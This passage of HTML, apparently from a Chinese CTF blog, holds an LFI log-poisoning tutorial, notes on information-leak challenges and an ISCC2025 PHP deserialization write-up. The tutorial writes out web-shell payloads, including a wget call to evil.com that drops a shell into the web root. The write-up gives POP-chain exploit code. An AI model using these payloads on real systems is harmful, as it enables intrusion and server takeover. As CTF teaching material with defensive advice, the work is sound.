class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>PHP信息<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">...</span><br></code></pre></td></tr></table></figure><p>只需在<code>&lt;!DOCTYPE html&gt;</code>前面查找就能看到命令执行结果</p></li></ol><h4 id="三、如何升级为完整-WebShell"><a href="#三、如何升级为完整-WebShell" class="headerlink" title="三、如何升级为完整 WebShell"></a>三、如何升级为完整 WebShell</h4><h5 id="方法1：直接写入-WebShell"><a href="#方法1：直接写入-WebShell" class="headerlink" title="方法1：直接写入 WebShell"></a>方法1：直接写入 WebShell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?file=/var/log/nginx/access.log&amp;2=file_put_contents(&#x27;shell.php&#x27;,&#x27;&lt;?php system($_GET[0]);?&gt;&#x27;);phpinfo();<br></code></pre></td></tr></table></figure><ul><li>效果：创建 <code>shell.php</code> 后门文件</li><li>使用：<code>http://target.com/shell.php?0=ls</code></li></ul><h5 id="方法2：下载现成-WebShell"><a href="#方法2：下载现成-WebShell" class="headerlink" title="方法2：下载现成 WebShell"></a>方法2：下载现成 WebShell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?file=/var/log/nginx/access.log&amp;2=system(&#x27;wget http://evil.com/shell.txt -O /var/www/html/shell.php&#x27;);phpinfo();<br></code></pre></td></tr></table></figure><h5 id="方法3：使用专业工具连接"><a href="#方法3：使用专业工具连接" class="headerlink" title="方法3：使用专业工具连接"></a>方法3：使用专业工具连接</h5><ol><li>写入 WebShell 后</li><li>使用中国蚁剑&#x2F;冰蝎连接：<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">连接<span class="hljs-built_in">URL</span>：<span class="hljs-keyword">http</span>://target.com/<span class="hljs-built_in">shell</span>.php<br>密码：cmd（根据WebShell代码设定）<br></code></pre></td></tr></table></figure><img src="https://example.com/antsword.jpg" alt="蚁剑界面示例"></li></ol><h4 id="四、为什么需要这样操作？"><a href="#四、为什么需要这样操作？" class="headerlink" title="四、为什么需要这样操作？"></a>四、为什么需要这样操作？</h4><ol><li><p><strong>绕过防御</strong>：</p><ul><li>当直接上传文件被禁止时</li><li>当常见协议（php:&#x2F;&#x2F;, data:&#x2F;&#x2F;）被过滤时</li></ul></li><li><p><strong>隐蔽性强</strong>：</p><ul><li>日志文件是合法系统文件</li><li>不会新增可疑文件（无文件落地）</li></ul></li><li><p><strong>多阶段攻击</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sequence">攻击者-&gt;服务器: 污染日志<br>攻击者-&gt;服务器: 触发包含漏洞<br>服务器--&gt;攻击者: 返回命令结果<br>攻击者-&gt;服务器: 部署WebShell<br>服务器--&gt;攻击者: 持久控制通道<br></code></pre></td></tr></table></figure></li></ol><h4 id="五、实际案例演示"><a href="#五、实际案例演示" class="headerlink" title="五、实际案例演示"></a>五、实际案例演示</h4><p>假设目标网站：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//vuln-site.com/index.php?page=about.php</span><br></code></pre></td></tr></table></figure><p><strong>攻击过程</strong>：</p><ol><li><p>检测LFI漏洞：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>vuln-site.com<span class="hljs-regexp">/index.php?page=/</span>etc/passwd<br></code></pre></td></tr></table></figure></li><li><p>污染日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://vuln-site.com/&lt;?php system(\$_GET[&#x27;exec&#x27;]);?&gt;&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>执行命令（查找flag）：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">http://vuln-site.com/<span class="hljs-built_in">index</span>.php?page=/var/<span class="hljs-built_in">log</span>/nginx/<span class="hljs-keyword">access</span>.<span class="hljs-built_in">log</span>&amp;exec=find / -<span class="hljs-keyword">name</span> flag*<br></code></pre></td></tr></table></figure></li><li><p>结果定位：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">/var/secret/flag.txt  &lt;-- 命令输出<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>       &lt;-- phpinfo起始标记<br></code></pre></td></tr></table></figure></li><li><p>读取flag：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>vuln-site.com<span class="hljs-regexp">/index.php?page=/</span>var<span class="hljs-regexp">/log/</span>nginx<span class="hljs-regexp">/access.log&amp;exec=cat /</span>var<span class="hljs-regexp">/secret/</span>flag.txt<br></code></pre></td></tr></table></figure></li></ol><h4 id="六、防御措施"><a href="#六、防御措施" class="headerlink" title="六、防御措施"></a>六、防御措施</h4><ol><li><p><strong>服务器防护</strong>：</p><ul><li>设置 <code>open_basedir</code> 限制文件访问范围</li><li>禁用危险函数：<code>system, exec, shell_exec</code></li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">disable_functions</span> = system,exec,passthru<br></code></pre></td></tr></table></figure></li><li><p><strong>日志安全</strong>：</p><ul><li>将日志移出Web目录</li><li>设置日志文件不可执行</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chattr +i /var/log/nginx/access.log<br></code></pre></td></tr></table></figure></li><li><p><strong>代码层面</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 安全的文件包含</span><br><span class="hljs-variable">$allowed</span> = [<span class="hljs-string">&#x27;about&#x27;</span>,<span class="hljs-string">&#x27;contact&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>], <span class="hljs-variable">$allowed</span>)) &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>].<span class="hljs-string">&#x27;.php&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>入侵检测</strong>：</p><ul><li>监控异常日志条目（包含<code>&lt;?php</code>的请求）</li><li>使用WAF过滤包含特殊字符的请求</li></ul></li></ol><p>这种攻击方式巧妙利用了服务器自身的日志功能，即使在没有文件上传漏洞的情况下也能实现完全控制，是LFI漏洞中最危险的利用方式之一。</p><p>直接通过get请求写马会导致代码被URL编码，导致日志中存储的是编码后的文本，不是可执行代码。UA头不会被编码</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>信息搜集</title>
    <link href="/2025/06/04/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <url>/2025/06/04/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>网站根目录下存在robots.txt文件，其内容规定了网络爬虫可爬和不可爬的目录文件。</p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p><strong>phps文件</strong>就是php的源代码文件，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。</p><p>因为用户无法直接通过Web浏览器“看到”php文件的内容，所以需要用phps文件代替。直接访问&#x2F;index.phps即可获得php</p><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>www源码泄露</p><p>访问url&#x2F;<a href="http://www.zip,通过其源码泄露,发现index.php文件/">www.zip，通过其源码泄露，发现index.php文件</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-01 14:37:13</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-01 14:42:44</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//flag in fl000g.txt</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;web6:where is flag?&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>fl000g.txt里显示flag{flag_here}，尝试直接url&#x2F;fl000g.txt，得到flag</p><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><blockquote><p>版本控制很重要，但不要部署到生产环境更重要。</p></blockquote><p>开发人员在开发时，常常会先把源码提交到远程托管网站（如github），最后再从远程托管网站把源码pull到服务器的web目录下，如果忘记把.git文件删除，就造成此漏洞。利用.git文件恢复网站的源码，而源码里可能会有数据库的信息。<br>当前大量开发人员使用git进行版本控制，对站点自动部署。 如果配置不当，可能会将.git文件夹直接部署到线上环境，这就引起了git泄露漏洞。</p><p>尝试&#x2F;.git得到flag</p><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>主流的版本控制器有git和svn，访问&#x2F;.svn得到flag</p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><blockquote><p>发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</p></blockquote><p>在Linux生产环境上使用vim或者vi做修改时，会生成一个swp为后缀的文件.</p><ul><li>第一次意外退出生成的是.swp</li><li>第二次意外退出生成的是.swo</li><li>第三次为.swn</li></ul><p>访问&#x2F;index.php.swp获得带有flag的文件</p><h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><blockquote><p>有时候网站上的公开信息，就是管理员常用密码</p></blockquote><p>访问&#x2F;admin，弹出登陆界面，账号用admin，密码从网站里找</p><h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><blockquote><p>有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p></blockquote><p>访问&#x2F;editor，是文件上传界面，点击文件空间，从var&#x2F;www&#x2F;html找到nothinghere，点进去是fl000g.txt，访问&#x2F;nothinghere&#x2F;fl000g.txt得到flag</p><h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><blockquote><p>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p></blockquote><p>登录界面找回密保问题，通过文章里的qq邮箱得到居住地，成功找回密码。</p><h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><blockquote><p>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p></blockquote><p>访问tz.php找到flag</p><h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><blockquote><p>备份的sql文件会泄露敏感信息</p></blockquote><p>扫到backup.sql得到flag</p><h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><blockquote><p>玩101分给你flag</p></blockquote><p>找到js文件，看见大于100分输出的字符串，解码获得flag</p><h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><p>mdb文件从txt打开，虽然是乱码也可以搜到flag</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ISCC2025</title>
    <link href="/2025/05/30/ISCC2025/"/>
    <url>/2025/05/30/ISCC2025/</url>
    
    <content type="html"><![CDATA[<p>这次比赛难度适中，唯一可惜校赛web信仰之下脑洞太大，xss没解出来，全国总决赛排名在第三十九（下次争取更好）</p><h1 id="决赛部分"><a href="#决赛部分" class="headerlink" title="决赛部分"></a>决赛部分</h1><h2 id="谁动了我的奶酪？"><a href="#谁动了我的奶酪？" class="headerlink" title="谁动了我的奶酪？"></a>谁动了我的奶酪？</h2><p>直接输入汤姆猫得到题目源代码</p><p><em>据目击鼠鼠称，那Tom坏猫确实拿了一块儿奶酪，快去找找吧！</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;据目击鼠鼠称，那Tom坏猫确实拿了一块儿奶酪，快去找找吧！&quot;</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Tom</span></span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$stolenCheese</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$trap</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;cheesemap.php&#x27;</span></span>)</span>&#123;<br> <span class="hljs-variable language_">$this</span>-&gt;stolenCheese = <span class="hljs-variable">$file</span>;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Tom盯着你，想要守住他抢走的奶酪！&quot;</span>.<span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br> &#125;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">revealCheeseLocation</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;stolenCheese)&#123;<br> <span class="hljs-variable">$cheeseGuardKey</span> = <span class="hljs-string">&quot;cheesemap.php&quot;</span>;<br> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">nl2br</span>(<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;stolenCheese)));<br> <span class="hljs-variable language_">$this</span>-&gt;stolenCheese = <span class="hljs-title function_ invoke__">str_rot3</span>(<span class="hljs-variable">$cheeseGuardKey</span>);<br> &#125;<br> &#125;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toString</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>]) || <span class="hljs-variable">$SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>] !== <span class="hljs-string">&quot;JerryBrowser&quot;</span>) &#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Tom 盯着你的浏览器，觉得它不太对劲……&quot;</span>;<br> &#125;<span class="hljs-keyword">else</span>&#123;<br> <span class="hljs-variable language_">$this</span>-&gt;trap[<span class="hljs-string">&#x27;trap&#x27;</span>]-&gt;stolenCheese;<br> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Tom&quot;</span>;<br> &#125;<br> &#125;<br> <br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stoleCheese</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-variable">$Messages</span> = [<br> <span class="hljs-string">&quot;Tom偷偷看了你一眼，然后继续啃奶酪...&quot;</span>,<br> <span class="hljs-string">&quot;墙角的奶酪碎屑消失了，它们去了哪里？&quot;</span>,<br> <span class="hljs-string">&quot;Cheese的香味越来越浓，谁在偷吃？&quot;</span>,<br> <span class="hljs-string">&quot;Jerry皱了皱眉，似乎察觉到了什么异常……&quot;</span>,<br> ];<br> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$Messages</span>[<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-variable">$Messages</span>)];<br> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">revealCheeseLocation</span>();<br> &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Jerry</span></span>&#123;<br> <span class="hljs-keyword">protected</span> <span class="hljs-variable">$secretHidingSpot</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$squeak</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$shout</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">searchForCheese</span>(<span class="hljs-params"><span class="hljs-variable">$mouseHole</span></span>)</span>&#123;<br> <span class="hljs-keyword">include</span>(<span class="hljs-variable">$mouseHole</span>);<br> &#125;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">searchForCheese</span>(<span class="hljs-variable">$this</span>-&gt;secretHidingSpot);<br> &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cheese</span></span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$flavors</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$color</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">construct</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-variable language_">$this</span>-&gt;flavors = <span class="hljs-keyword">array</span>();<br> &#125;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$slice</span></span>)</span>&#123;<br> <span class="hljs-variable">$melt</span> = <span class="hljs-variable language_">$this</span>-&gt;flavors;<br> <span class="hljs-keyword">return</span> <span class="hljs-variable">$melt</span>();<br> &#125;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;color)();<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Where is my cheese?&quot;</span>;<br> &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;cheese_tracker&#x27;</span>])) &#123;<br> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;cheese_tracker&#x27;</span>]);<br>&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GET</span>[<span class="hljs-string">&quot;clue&quot;</span>]))&#123;<br> <span class="hljs-variable">$clue</span> = <span class="hljs-variable">$GET</span>[<span class="hljs-string">&quot;clue&quot;</span>];<br> <span class="hljs-variable">$clue</span> = <span class="hljs-title function_ invoke__">str_replace</span>([<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;！&quot;</span>], <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-variable">$clue</span>);<br> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$clue</span>))&#123;<br> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$clue</span>)-&gt;squeak = <span class="hljs-string">&quot;Thief!&quot;</span>;<br> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$clue</span>)-&gt;shout === <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$clue</span>)-&gt;squeak)<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;cheese is hidden in &quot;</span>.<span class="hljs-variable">$where</span>;<br> <span class="hljs-keyword">else</span><br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;OHhhh no!find it yourself!&quot;</span>;<br> &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>绕过clue检测得到文件位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Jerry</span></span>&#123; <br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$secretHidingSpot</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$squeak</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shout</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">searchForCheese</span>(<span class="hljs-params"><span class="hljs-variable">$mouseHole</span></span>)</span>&#123; <br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$mouseHole</span>); <br>    &#125; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">searchForCheese</span>(<span class="hljs-variable">$this</span>-&gt;secretHidingSpot); <br>    &#125; <br>&#125; <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Jerry</span>())); <br><br></code></pre></td></tr></table></figure><p><img src="/%5Cimages%5CISCC1.png"></p><p>文件位置所在<code>cheese is hidden in flag_of_cheese.php</code></p><p>构造pop链子利用include函数去读取此文件，链子就触发到 **destruct()**<strong>再到</strong>invoke()就能触发到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;据目击鼠鼠称，那Tom坏猫确实拿了一块儿奶酪，快去找找吧！&lt;/h2&gt;&quot;</span>; <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Jerry</span></span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$secretHidingSpot</span>=<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag_of_cheese.php&#x27;</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$squeak</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shout</span>; <br>&#125; <br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cheese</span></span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flavors</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$color</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-variable language_">$this</span>-&gt;flavors = <span class="hljs-keyword">array</span>(); <br>    &#125; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$slice</span></span>)</span>&#123; <br>        <span class="hljs-variable">$melt</span> = <span class="hljs-variable language_">$this</span>-&gt;flavors; <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$melt</span>(); <br>    &#125; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;color)(); <br>    &#125; <br>&#125; <br> <br><span class="hljs-variable">$q</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cheese</span>(); <br><span class="hljs-variable">$w</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Jerry</span>(); <br><span class="hljs-variable">$q</span>-&gt;color=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$w</span>); <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$q</span>));<br><br></code></pre></td></tr></table></figure><p><img src="/%5Cimages%5CISCC2.png"></p><p>PD9waHAKICAgICRmbGFnID0gIklTQ0N7Y2gzM3NlX3RoIWVmXyE1X3RoZSI7CiAgICAvLyDkvYbmgI7kuYjlj6rmnInkuIDljYrlkaLvvJ8KCS8vIEplcnJ56L+Y5ZCs5Yiw5Yir55qE6byg6byg6K+0VG9t55SoMjLnmoQxNui&#x2F;m+WItuW8guaIluS7gOS5iOeahO+8jOWVpeaEj+aAneWRou+8nwo&#x2F;Pg&#x3D;&#x3D;</p><p>解密得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;ISCC&#123;ch33se_th!ef_!5_the&quot;</span>;<br> <span class="hljs-comment">// 但怎么只有一半呢？</span><br> <span class="hljs-comment">// Jerry还听到别的鼠鼠说Tom用22的16进制异或什么的，啥意思呢？</span><br> <span 